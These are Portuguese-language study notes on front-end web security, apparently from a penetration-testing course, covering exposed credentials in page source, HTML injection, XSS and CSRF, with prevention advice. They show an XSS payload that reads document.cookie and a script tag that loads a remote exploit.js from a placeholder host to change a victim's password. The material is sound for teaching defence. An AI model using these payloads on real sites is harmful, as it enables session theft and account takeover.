

## Sensitive Data Exposure

Todos os componentes de front-end que abordamos são interagidos no lado do cliente. Portanto, se forem atacados, não representam uma ameaça direta ao back-end principal do aplicativo da Web e geralmente não causam danos permanentes.

No entanto, como esses componentes são executados no lado do cliente, eles colocam o usuário final em risco de ser atacado e explorado se tiverem alguma vulnerabilidade. Se uma vulnerabilidade de front-end for aproveitada para atacar usuários administrativos, isso pode resultar em acesso não autorizado, acesso a dados confidenciais, interrupção do serviço e muito mais.

Embora a maioria dos testes de penetração de aplicativos da Web seja focada em componentes de back-end e suas funcionalidades, é importante também testar os componentes de front-end em busca de possíveis vulnerabilidades, pois esses tipos de vulnerabilidades às vezes podem ser utilizados para obter acesso a funcionalidades confidenciais (ou seja, um painel de administração), o que pode levar ao comprometimento de todo o servidor.

A exposição de dados confidenciais refere-se à disponibilidade de dados confidenciais em texto não criptografado para o usuário final. Isso geralmente é encontrado no código-fonte da página da Web ou na fonte da página no front-end dos aplicativos da Web. Este é o código-fonte HTML do aplicativo, não deve ser confundido com o código de back-end que normalmente só é acessível no próprio servidor. Podemos visualizar a fonte da página de qualquer site em nosso navegador clicando com o botão direito do mouse em qualquer lugar da página e selecionando Exibir fonte da página no menu pop-up. Às vezes, um desenvolvedor pode desabilitar o clique com o botão direito do mouse em um aplicativo da web, mas isso não nos impede de visualizar o código-fonte da página, pois podemos simplesmente digitar ctrl + u ou visualizar o código-fonte da página por meio de um proxy da Web, como o Burp Suite. Vamos dar uma olhada na fonte da página google.com. Clique com o botão direito do mouse e escolha Exibir fonte da página, e uma nova guia será aberta em nosso navegador com o URL view-source:https://www.google.com/. Aqui podemos ver o HTML, JavaScript e links externos. Reserve um momento para navegar um pouco na origem da página.

![[Pasted image 20230609160054.png]]

Às vezes, podemos encontrar credenciais de login, hashes ou outros dados confidenciais ocultos nos comentários do código-fonte de uma página da Web ou no código JavaScript externo que está sendo importado. Outras informações confidenciais podem incluir links ou diretórios expostos ou até mesmo informações do usuário expostas, todas as quais podem ser potencialmente aproveitadas para promover nosso acesso dentro do aplicativo da web ou até mesmo na infraestrutura de suporte do aplicativo da web (servidor da web, servidor de banco de dados, etc.).

Por esse motivo, uma das primeiras coisas que devemos fazer ao avaliar um aplicativo da Web é revisar o código-fonte da página para ver se podemos identificar qualquer 'fruto mais fácil', como credenciais expostas ou links ocultos.

![[Pasted image 20230609160136.png]]

```html
<form action="action_page.php" method="post">

    <div class="container">
        <label for="uname"><b>Username</b></label>
        <input type="text" required>

        <label for="psw"><b>Password</b></label>
        <input type="password" required>

        <!-- TODO: remove test credentials test:test -->

        <button type="submit">Login</button>
    </div>
</form>

</html>
```

Vemos que os desenvolvedores adicionaram alguns comentários que esqueceram de remover, que contêm credenciais de teste:

```html
<!-- TODO: remove test credentials test:test -->
```

O comentário parece ser um lembrete para os desenvolvedores removerem as credenciais de teste. Dado que o comentário ainda não foi removido, essas credenciais ainda podem ser válidas.

Embora não seja muito comum encontrar credenciais de login nos comentários do desenvolvedor, ainda podemos encontrar várias informações confidenciais e valiosas ao examinar o código-fonte, como páginas ou diretórios de teste, parâmetros de depuração ou funcionalidade oculta. Existem várias ferramentas automatizadas que podemos usar para verificar e analisar o código-fonte da página disponível para identificar possíveis caminhos ou diretórios e outras informações confidenciais.

Aproveitar esses tipos de informações pode nos dar mais acesso ao aplicativo da web, o que pode nos ajudar a atacar os componentes de back-end para obter controle sobre o servidor.

## HTML Injection

Outro aspecto importante da segurança de front-end é validar e limpar a entrada do usuário aceita. Em muitos casos, a validação e sanitização da entrada do usuário é realizada no back-end. No entanto, algumas entradas do usuário nunca chegariam ao back-end em alguns casos e são completamente processadas e renderizadas no front-end. Portanto, é fundamental validar e higienizar a entrada do usuário no front-end e no back-end.

A injeção de HTML ocorre quando a entrada não filtrada do usuário é exibida na página. Isso pode ser feito recuperando o código enviado anteriormente, como recuperar um comentário do usuário do banco de dados de back-end, ou exibindo diretamente a entrada do usuário não filtrada por meio de JavaScript no front-end.

Quando um usuário tem controle total de como sua entrada será exibida, ele pode enviar o código HTML e o navegador pode exibi-lo como parte da página. Isso pode incluir um código HTML malicioso, como um formulário de login externo, que pode ser usado para induzir os usuários a fazer login enquanto enviam suas credenciais de login a um servidor malicioso para serem coletadas para outros ataques.

Outro exemplo de injeção de HTML é a desfiguração de páginas da web. Isso consiste em injetar um novo código HTML para alterar a aparência da página da Web, inserir anúncios maliciosos ou até alterar completamente a página. Esse tipo de ataque pode resultar em graves danos à reputação da empresa que hospeda o aplicativo da web.

![[Pasted image 20230609170807.png]]

Se nenhuma limpeza de entrada estiver em vigor, isso é potencialmente um alvo fácil para ataques de HTML Injection e Cross-Site Scripting (XSS). Damos uma olhada no código-fonte da página e não vemos nenhuma sanitização de entrada, pois a página recebe a entrada do usuário e a exibe diretamente:

```html
<!DOCTYPE html>
<html>

<body>
    <button onclick="inputFunction()">Click to enter your name</button>
    <p id="output"></p>

    <script>
        function inputFunction() {
            var input = prompt("Please enter your name", "");

            if (input != null) {
                document.getElementById("output").innerHTML = "Your name is " + input;
            }
        }
    </script>
</body>

</html>
```

Para testar a injeção de HTML, podemos simplesmente inserir um pequeno trecho de código HTML como nosso nome e ver se ele é exibido como parte da página. Vamos testar o seguinte código, que altera a imagem de fundo da página web:

```html
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```

Depois de inseri-lo, vemos que a imagem de fundo da página da web muda instantaneamente:

![[Pasted image 20230609171232.png]]

#### Cross-Site Scripting (XSS)

Muitas vezes, as vulnerabilidades de injeção de HTML também podem ser utilizadas para executar ataques Cross-Site Scripting (XSS) injetando código JavaScript para ser executado no lado do cliente. Uma vez que podemos executar o código na máquina da vítima, podemos potencialmente obter acesso à conta da vítima ou até mesmo à sua máquina. O XSS é muito semelhante ao HTML Injection na prática. No entanto, o XSS envolve a injeção de código JavaScript para executar ataques mais avançados no lado do cliente, em vez de simplesmente injetar código HTML. Existem três tipos principais de XSS:

- Reflected XSS: Ocorre quando a entrada do usuário é exibida na página após o processamento (por exemplo, resultado de pesquisa ou mensagem de erro).
- Stored XSS: Ocorre quando a entrada do usuário é armazenada no banco de dados de back-end e exibida após a recuperação (por exemplo, postagens ou comentários).
- DOM XSS: Ocorre quando a entrada do usuário é mostrada diretamente no navegador e é gravada em um objeto HTML DOM (por exemplo, nome de usuário vulnerável ou título da página).

No exemplo que vimos para HTML Injection, não houve limpeza de entrada. Portanto, pode ser possível que a mesma página seja vulnerável a ataques XSS. Podemos tentar injetar o seguinte código JavaScript DOM XSS como uma carga útil, que deve nos mostrar o valor do cookie para o usuário atual:

```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

Depois de inserir nossa carga útil e clicar em ok, vemos que uma janela de alerta aparece com o valor do cookie:

![[Pasted image 20230609181941.png]]

Esta carga está acessando a árvore do documento HTML e recuperando o valor do objeto cookie. Quando o navegador processar nossa entrada, ele será considerado um novo DOM e nosso JavaScript será executado, exibindo o valor do cookie de volta para nós em um pop-up.

Um invasor pode aproveitar isso para roubar sessões de cookie e enviá-las para si mesmo e tentar usar o valor do cookie para autenticar a conta da vítima. O mesmo ataque pode ser usado para executar vários tipos de outros ataques contra os usuários de um aplicativo da web. XSS é um tópico vasto que será abordado em profundidade em módulos posteriores.

### Cross-Site Request Forgery (CSRF)

O terceiro tipo de vulnerabilidade de front-end causada pela entrada não filtrada do usuário é a falsificação de solicitação entre sites (CSRF). Os ataques CSRF podem utilizar vulnerabilidades XSS para realizar determinadas consultas, e chamadas de API em um aplicativo da Web no qual a vítima está autenticada no momento. Isso permitiria que o invasor executasse ações como o usuário autenticado. Ele também pode utilizar outras vulnerabilidades para executar as mesmas funções, como utilizar parâmetros HTTP para ataques.

Um ataque CSRF comum para obter acesso privilegiado a um aplicativo da Web é criar uma carga útil de JavaScript que altera automaticamente a senha da vítima para o valor definido pelo invasor. Depois que a vítima visualizar a carga útil na página vulnerável (por exemplo, um comentário malicioso contendo a carga útil CSRF do JavaScript), o código JavaScript será executado automaticamente. Ele usaria a sessão de login da vítima para alterar sua senha. Feito isso, o invasor pode fazer login na conta da vítima e controlá-la.

O CSRF também pode ser aproveitado para atacar administradores e obter acesso às suas contas. Os administradores geralmente têm acesso a funções confidenciais, que às vezes podem ser usadas para atacar e obter controle sobre o servidor de back-end (dependendo da funcionalidade fornecida aos administradores em um determinado aplicativo da web). Seguindo esse exemplo, ao invés de usar o código JavaScript que retornaria o cookie da sessão, carregaríamos um arquivo .js (JavaScript) remoto, conforme a seguir:

```html
"><script src=//www.example.com/exploit.js></script>
```

O arquivo exploit.js conteria o código JavaScript malicioso que altera a senha do usuário. Desenvolver o exploit.js neste caso requer conhecimento do procedimento de alteração de senha e APIs deste aplicativo da web. O invasor precisaria criar um código JavaScript que replicasse a funcionalidade desejada e a executasse automaticamente (ou seja, código JavaScript que altera nossa senha para esse aplicativo da Web específico).

##### Prevention

Embora deva haver medidas no back-end para detectar e filtrar a entrada do usuário, também é sempre importante filtrar e higienizar a entrada do usuário no front-end antes que ela chegue ao back-end e, especialmente, se esse código puder ser exibido diretamente no lado do cliente sem se comunicar com o back-end. Dois controles principais devem ser aplicados ao aceitar a entrada do usuário:
- Sanitização: Remoção de caracteres especiais e não padrão da entrada do usuário antes de exibi-los ou armazená-los.
- Validation: Garantir que a entrada do usuário enviada corresponda ao formato esperado (ou seja, o e-mail enviado corresponda ao formato de e-mail)

Além disso, também é importante higienizar a saída exibida e limpar quaisquer caracteres especiais/não padrão. Caso um invasor consiga contornar os filtros de sanitização e validação de front-end e back-end, ainda não causará nenhum dano no front-end.

Depois de limpar e/ou validar a entrada do usuário e a saída exibida, devemos ser capazes de evitar ataques como HTML Injection, XSS ou CSRF. Outra solução seria implementar um firewall de aplicativo da web (WAF), que deve ajudar a evitar tentativas de injeção automaticamente. No entanto, deve-se observar que as soluções WAF podem ser potencialmente ignoradas, portanto, os desenvolvedores devem seguir as práticas recomendadas de codificação e não apenas confiar em um dispositivo para detectar/bloquear ataques.

Quanto ao CSRF, muitos navegadores modernos possuem medidas anti-CSRF integradas, que impedem a execução automática do código JavaScript. Além disso, muitos aplicativos da Web modernos têm medidas anti-CSRF, incluindo certos cabeçalhos e sinalizadores HTTP que podem impedir solicitações automatizadas (ou seja, token anti-CSRF ou http-only/X-XSS-Protection). Certas outras medidas podem ser tomadas a nível funcional, como exigir que o usuário insira sua senha antes de alterá-la. Muitas dessas medidas de segurança podem ser ignoradas e, portanto, esses tipos de vulnerabilidades ainda podem representar uma grande ameaça para os usuários de um aplicativo da web. É por isso que essas precauções devem ser consideradas apenas como uma medida secundária, e os desenvolvedores devem sempre garantir que seu código não seja vulnerável a nenhum desses ataques.

Esta folha de dicas de prevenção de falsificação de solicitação entre sites da OWASP(https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) discute as medidas de prevenção e ataque em mais detalhes.